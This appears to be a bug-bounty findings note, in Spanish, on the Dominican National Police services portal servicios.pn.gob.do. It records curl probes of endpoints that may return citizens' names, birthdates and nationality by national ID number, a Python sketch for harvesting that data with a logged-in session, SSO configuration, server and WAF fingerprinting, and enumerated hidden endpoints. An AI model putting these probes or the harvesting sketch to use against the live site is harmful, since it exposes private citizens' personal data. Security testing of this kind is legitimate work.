---
name: servicios-pn-gob-do-findings
description: Detailed technical findings for servicios.pn.gob.do bug bounty
---

# 🔍 Hallazgos Técnicos: servicios.pn.gob.do

## H1: `/account/findcedula/{cedula}` — Bulk PII Data Leak

### Descubrimiento
Encontrado en `/js/site.js` línea 7:

```javascript
$.getJSON(baseUrl + '/account/findcedula/' + cedula, function (data) {
    $('#Name').val(data.names);
    $('#LastName').val(data.firstSurname + ' ' + data.secondSurname);
    ...
    $('#Dob').val(data.birthdate);
    $('#Gender').val(data.genre);
    $('#Nationality').val(data.nationality);
});
```

### Comportamiento
- **GET sin auth:** HTTP 404 (WAF/servidor posiblemente bloquea)
- **GET con sesión:** Potencialmente 200 JSON con PII
- **POST:** HTTP 411 (Length Required) — endpoint existe y espera datos
- **Cédula inválida:** HTTP 404

### Pruebas realizadas
```bash
# Sin sesión — 404
curl -sk "https://servicios.pn.gob.do/account/findcedula/00116574310"  # → 404

# Con sesión ASP.NET — 404 (sesión insuficiente)
curl -sk -b "COOKIES" "https://servicios.pn.gob.do/account/findcedula/00116574310"  # → 404

# POST — 411 (endpoint existe pero requiere body)
curl -sk -X POST "https://servicios.pn.gob.do/account/findcedula/00116574310"  # → 411
```

### Explotación (con sesión válida)
```python
import requests
s = requests.Session()
s.get("https://servicios.pn.gob.do/")  # Init session
# Login to UltiCabinet
# Then: s.get(f"https://servicios.pn.gob.do/account/findcedula/{cedula}")
# Response: {"names": "...", "firstSurname": "...", "secondSurname": "...",
#            "birthdate": "...", "genre": "...", "nationality": "..."}
```

---

## H2: `/wfp/getcedulaname/{cedula}` — Secondary PII Endpoint

### Descubrimiento
Encontrado en HTML renderizado de verificación vehicular:

```javascript
$.get("https://servicios.pn.gob.do/wfp/getcedulaname/" + cedula, function (data, status) { ... });
```

### Comportamiento
- **GET:** HTTP 405 (Method Not Allowed)
- **POST (sin auth):** HTTP 302 (redirect a login)
- **POST (con auth):** Potencialmente 200 JSON

---

## H3: UltiCabinet SSO Analysis

### OIDC Configuration
```json
GET /.well-known/openid-configuration → HTTP 200
{
  "issuer": "https://auth.ulticabinet.com",
  "token_endpoint": "https://auth.ulticabinet.com/connect/token",
  "grant_types_supported": [
    "authorization_code",
    "client_credentials",
    "refresh_token",
    "implicit",
    "password",
    "urn:ietf:params:oauth:grant-type:device_code"
  ],
  "scopes_supported": ["openid", "profile", "uc", "offline_access"],
  "claims_supported": ["sub", "name", "family_name", "given_name", "birthdate", "gender", ...]
}
```

### JWKS Public Key
```json
GET /.well-known/openid-configuration/jwks → HTTP 200
{
  "keys": [{
    "kty": "RSA",
    "use": "sig",
    "kid": "02E1874D52EE393022152D9B61BF6BF0",
    "alg": "RS256",
    "e": "AQAB",
    "n": "2W5F0aUmItI_OEgs5gddupXteXVI_YRZrQlu2uX5RJIGJTKAfsG9h8Sv..."
  }]
}
```

### Login Flow
1. GET `/wfp/index` → redirect a `auth.ulticabinet.com/Account/Login?...`
2. Login form: cédula + password + `__RequestVerificationToken`
3. POST `/Account/Login` → valida credenciales
4. Redirect a `servicios.pn.gob.do/signin-oidc` con code PKCE

---

## H4: Infrastructure Details

### Server Fingerprinting
```http
HTTP/2 200
x-powered-by: ASP.NET
x-l11-trace: ash3-lb1 (load balancer node 1)
x-l11-trace: ash3-lb2 (load balancer node 2)
x-proxy-cache: MISS
set-cookie: .AspNetCore.Session=CfDJ8Hg...
```

### WAF Detection
```http
HTTP 473 → "Request Blocked by Web Application Firewall - CSIRT-RD"
```

### CDN
- **Front-end:** Link11 GmbH (Frankfurt, Germany) → WAF + CDN
- **Backend UltiCabinet:** Cloudflare (104.26.x.x, 172.67.x.x)

---

## H5: Service Codes Enumeration

### Service Categories
| Code | Name | Sub-services |
|------|------|-------------|
| S99 | Certificación de Vehículos | 14 (IDs 1-14) |
| S97 | Postulación | 1 |
| S75 | Validación de Celulares | 1 |

### Path Structure
- `/wfp/services` — Service catalog
- `/wfp/create/S99/{id}` — Service application form (public)
- `/wfp/create/S75/{id}` — Phone validation form (public)
- `/wfp/opencustom/S99/{id}` — Open service request (auth required → 302)
- `/wfp/createcustom/S99/{id}` — Create service request (auth required → 302)
- `/wfp/index/S99` — Filter requests by service category

### Pricing
- Vehicle certifications: RD$100 (digital, 24h delivery)
- Phone validation: GRATIS (automatic, immediate)
- Payment: 100% online required before request submission

---

## H6: Hidden Endpoints Found

| Path | Method | Response | Notes |
|------|--------|----------|-------|
| `/wfp/search` | POST | 200 HTML | Service search page |
| `/services/find?query=` | GET | 200 JSON (empty) | Service autocomplete |
| `/wfp/index/S99` | GET | 200 HTML | Filter by vehicle cert |
| `/wfp/index/S75` | GET | 200 HTML | Filter by phone validation |
| `/wfp/index/S97` | GET | 200 HTML | Filter by citizen application |

---

## H7: Related Domains

| Domain | Status | Notes |
|--------|--------|-------|
| servicios.pn.gob.do | ✅ 200 | Portal activo |
| policia.gob.do | ⚠️ 500 | ERROR — info disclosure potencial |
| pn.gob.do | ⚠️ Timeout | Cloudflare DNS resolvable |
| auth.ulticabinet.com | ✅ 200 | SSO provider activo |

---

## Tools Used
- curl (HTTP probing)
- Shodan (IP/port intelligence)
- dig (DNS enumeration)
- Browser headless (visual recon)
- Python (analysis)
